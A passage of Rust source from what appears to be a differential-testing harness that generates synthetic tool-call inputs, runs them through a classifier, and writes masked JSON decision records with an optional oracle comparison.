            let origin = match go.below(10) {
                0..=2 => Some(Origin::Member("alice".into())),
                3 => Some(Origin::Member("bob".into())),
                _ => None,
            };
            rows.push(Row { id: format!("c2own:{i}"), grp: "C2own".into(), tool, cwd, input, share: Some(share), origin, full: false });
        }
    }
    // C3: free text
    for i in 0..envn("QPA_N_FREE", 1_500) {
        let t = gen_free(&mut g, i);
        let (tool, input) = free_input(&mut g, &t);
        rows.push(Row { id: format!("c3:{i}"), grp: "C3".into(), tool, cwd: fx.ws.clone(), input, share: None, origin: None, full: false });
    }

    let mut f = std::io::BufWriter::new(std::fs::File::create(&out).unwrap());
    let mut decisions: u64 = 0;
    for r in &rows {
        let h = fx.hook_in(&r.cwd, &r.tool, r.input.clone());
        let mut a = classify(&h, HostOs::Posix, &fx.env(), &PosixNormaliser);
        if let Some(s) = r.share {
            a.share_flagged = s;
        }
        if let Some(o) = &r.origin {
            a.origin = o.clone();
        }
        let facts = owner_input_facts(&h);
        let sc = scans(&a);
        let input_text = r.input.to_string();
        let at_row = input_text.contains('@') || sc.iter().any(|(_, s)| s.exact.iter().chain(s.pieces.iter()).any(|w| w.contains('@')));
        let mut cols = serde_json::Map::new();
        for (sn, st) in &states {
            cols.insert(sn.to_string(), json!(columns(&a, st, &facts, &mask, at_row, r.full)));
            decisions += 12;
        }
        let mut line = json!({
            "id": r.id, "grp": r.grp, "tool": mask.apply(&r.tool), "cwd": mask.apply(r.cwd.to_str().unwrap()),
            "input": mask.apply(&input_text), "facts": format!("{facts:?}"), "at": at_row,
            "oversize": a.oversize.map(|s| s.to_string()),
            "scans": sc.iter().map(|(k, s)| json!({
                "src": k,
                "words": s.words.iter().map(|w| mask.apply(w)).collect::<Vec<_>>(),
                "exact": s.exact.iter().map(|w| mask.apply(w)).collect::<Vec<_>>(),
                "pieces": s.pieces.iter().map(|w| mask.apply(w)).collect::<Vec<_>>(),
                "raw_pieces_n": s.pieces.len(),
            })).collect::<Vec<_>>(),
            "cols": cols,
        });
        if twin_on {
            // THE MODEL (base tree only): the base action with this harness's own predicted pieces added where the
            // rule says they go, decided by THIS tree's engine. At the base this is an oracle for the head's answers.
            if let Some(m) = model_head(&a, &h, &fx.env()) {
                let mut mc = serde_json::Map::new();
                for (sn, st) in &states {
                    mc.insert(sn.to_string(), json!(columns(&m.action, st, &facts, &mask, at_row, r.full)));
                }
                line["model"] = json!({
                    "extras": m.extras.iter().map(|e| mask.apply(e)).collect::<Vec<_>>(),
                    "oversize": m.action.oversize.map(|s| s.to_string()),
                    "cols": mc,
                });
            }
        }
        writeln!(f, "{line}").unwrap();
    }
    f.flush().unwrap();
    eprintln!("QPA-DIFF seed {seed:#x} rows {} states {} decisions {decisions} twin {twin_on}", rows.len(), states.len());
}
